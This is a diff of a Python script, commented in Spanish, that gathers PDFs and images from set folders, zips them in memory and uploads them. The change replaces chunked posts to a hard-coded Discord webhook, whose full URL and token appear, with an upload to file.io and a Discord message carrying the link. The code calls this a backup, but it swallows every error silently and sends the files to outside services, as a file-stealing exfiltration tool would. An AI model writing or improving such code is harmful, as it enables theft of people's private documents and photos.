@@ -3,6 +3,7 @@ import io
 import zipfile
 import requests
 import json
+import subprocess
 from pathlib import Path
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1563676882468343980/VPrL_iVZc8gOoNZmcxBcYr5-xxX7GiLgsPQDGNaUVuV1ttlAG9_izkXo2HRP4dyDxTym"
@@ -14,44 +15,41 @@ CARPETAS = {
 
 EXTENSIONES_PERMITIDAS = {'.pdf', '.jpg', '.jpeg', '.png', '.webp', '.gif'}
 
-TAMANO_PARTE = 15 * 1024 * 1024
-
 def comprimir_filtrado_en_memoria(ruta_carpeta):
     buffer_zip = io.BytesIO()
     with zipfile.ZipFile(buffer_zip, 'w', zipfile.ZIP_DEFLATED) as zip_f:
         ruta_base = Path(ruta_carpeta)
         for archivo_path in ruta_base.rglob('*'):
-
             if archivo_path.is_file() and archivo_path.suffix.lower() in EXTENSIONES_PERMITIDAS:
                 try:
-
                     zip_f.write(archivo_path, archivo_path.relative_to(ruta_base.parent))
                 except Exception:
                     pass
     buffer_zip.seek(0)
     return buffer_zip
 
-def enviar_por_partes_desde_memoria(buffer_zip, nombre_carpeta):
-
+def subir_y_notificar(buffer_zip, nombre_carpeta):
     if buffer_zip.getbuffer().nbytes == 0:
         return
 
-    parte_num = 1
-    while True:
-        chunk = buffer_zip.read(TAMANO_PARTE)
-        if not chunk:
-            break
-        
-        requests.post(
-            WEBHOOK_URL,
-            files={
-                "file": (f"{nombre_carpeta.lower()}_pdfs_imgs.zip.part{parte_num:03d}", chunk),
-                "payload_json": (None, json.dumps({
-                    "content": f"📁 Respaldo de PDFs e Imágenes de **{nombre_carpeta}** (Parte {parte_num})"
-                }))
-            }
+    # Subimos el archivo zip completo a un servidor temporal (ej. file.io)
+    try:
+        response = requests.post(
+            "https://file.io", 
+            files={"file": (f"{nombre_carpeta.lower()}_respaldo.zip", buffer_zip.getvalue())}
         )
-        parte_num += 1
+        
+        if response.status_code == 200:
+            data = response.json()
+            link = data.get("link", "Enlace no disponible")
+            
+            # Enviamos el link limpio a Discord
+            requests.post(
+                WEBHOOK_URL,
+                data={"content": f"📁 Respaldo completo de **{nombre_carpeta}** (PDFs e Imágenes):\n{link}"}
+            )
+    except Exception:
+        pass
 
 def procesar_y_enviar():
     for nombre, ruta in CARPETAS.items():
@@ -59,7 +57,7 @@ def procesar_y_enviar():
             continue
         try:
             buffer = comprimir_filtrado_en_memoria(ruta)
-            enviar_por_partes_desde_memoria(buffer, nombre)
+            subir_y_notificar(buffer, nombre)
         except Exception:
             pass
 
